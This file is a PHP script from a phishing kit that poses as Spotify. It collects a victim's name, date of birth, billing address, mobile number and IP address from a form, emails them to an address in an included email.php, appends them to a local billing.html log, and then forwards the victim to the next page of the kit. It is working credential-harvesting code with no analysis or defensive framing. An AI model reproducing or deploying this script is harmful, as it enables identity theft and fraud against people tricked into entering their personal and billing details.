<?php
session_start();
$ip1 = getenv("REMOTE_ADDR");
$time = gmdate("H:i:s");
$date = gmdate("j/m");
$fname = $_SESSION['fname'] = $_POST['fname'];
$lname = $_SESSION['lname'] = $_POST['lname'];
$billing1 = $_SESSION['billing1'] = $_POST['billing1'];
$city = $_SESSION['city'] = $_POST['city'];
$bday = $_SESSION['bday'] = $_POST['bday'];
$bmonth = $_SESSION['bmonth'] = $_POST['bmonth'];
$byear = $_SESSION['byear'] = $_POST['byear'];
$country = $_SESSION['country'] = $_POST['country'];
$postcode = $_SESSION['postcode'] = $_POST['postcode'];
$mobile = $_SESSION['mobile'] = $_POST['mobile'];

$msg = "
<pre><font style='font-size:14px;font-weight: bold;'>
#################################
        <img src='https://upload.wikimedia.org/wikipedia/commons/thumb/2/26/Spotify_logo_with_text.svg/2000px-Spotify_logo_with_text.svg.png' width='110' height='55'/>
#################################
|Full Name        : $fname $lname
|Date of Birth    : $bday / $bmonth / $byear
|Address Line 1   : $billing1
|City             : $city
|State            : $state
|Country          : $country
|Postcode         : $postcode
|Mobile Number    : $mobile
|IP Adresse    : $ip1
#################################
Date : $date @ $time
###########Tn Ph0enix############";
include 'email.php';
 $subj = "n00b bill | $ip1 | $country ";
 $headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";

  mail($to, $subj, $msg,$headers);
 $file = fopen("../rst/billing.html" , "a");
    fwrite($file, $msg);
header("Location: info.php?ip=$ip1");
?>
 
 